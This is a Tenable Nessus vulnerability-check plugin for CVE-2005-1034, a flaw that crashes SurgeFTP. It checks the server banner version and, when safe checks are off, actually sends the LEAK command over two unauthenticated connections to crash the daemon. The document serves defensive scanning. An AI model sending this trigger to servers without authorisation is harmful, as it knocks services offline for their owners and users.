#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(18000);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2005-1034");
  script_bugtraq_id(13054);
  script_osvdb_id(15357);
 
  script_name(english:"SurgeFTP LEAK Command Remote DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of SurgeFTP that is prone to a
denial of service vulnerability when processing the non-standard LEAK
command.  Reportedly, an attacker can issue two of these commands
without authenticating and cause the ftp daemon process to crash." );
 script_set_attribute(attribute:"see_also", value:"http://www.security.org.sg/vuln/surgeftp22m1.html" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Apr/104" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to SurgeFTP 2.2m2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/04/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/07");
 script_cvs_date("$Date: 2016/11/03 20:40:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for LEAK command denial of service vulnerability in SurgeFTP";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");


port = get_ftp_port(default: 21);


# Get the banner and make sure it's for SurgeFTP.
banner = get_ftp_banner(port: port);
if (
  !banner ||
  " SurgeFTP " >!< banner
) exit(0);


# Check for the vulnerability.
if (safe_checks()) {
  # eg, "220 SurgeFTP netwin1 (Version 2.2k13)"
  if (egrep(string:banner, pattern:"^220 SurgeFTP .+Version (1\.|2\.([01]|2([a-l]m1[^0-9])))", icase:TRUE)) {
    report = strcat(
'Nessus has determined the vulnerability exists on the remote host\n',
'simply by looking at the version number of SurgeFTP installed there.\n' );
    security_warning(port:port, extra:report);
  }
}
else {
  # To actually exploit the vulnerability, we need to issue the 
  # LEAK command from two different connections.
  req = 'LEAK\r\n';
  max = 2;
  for (i=1; i<=max; i++) {
    sockets[i] = open_sock_tcp(port);
    if (sockets[i]) {
      send(socket:sockets[i], data:req);
    }
  }

  # It takes a while for the server to crash so try
  # a couple of times to open another connection.
  tries = 10;
  vuln = 0;
  while (i < (tries + max) && !vuln) {
    sleep(2);
    sockets[i] = open_sock_tcp(port);
    # nb: it's vulnerable if the initial two sockets (used for LEAK)
    #     were opened but this one wasn't.
    vuln = (sockets[1] && sockets[2] && !sockets[i]);
    if (sockets[i]) close(sockets[i]);
    ++i;
  }
  if (vuln) security_warning(port:port);

  # Release any sockets still open.
  for (i=1; i<=max; i++) {
    if (sockets[i]) close(sockets[i]);
  }
}
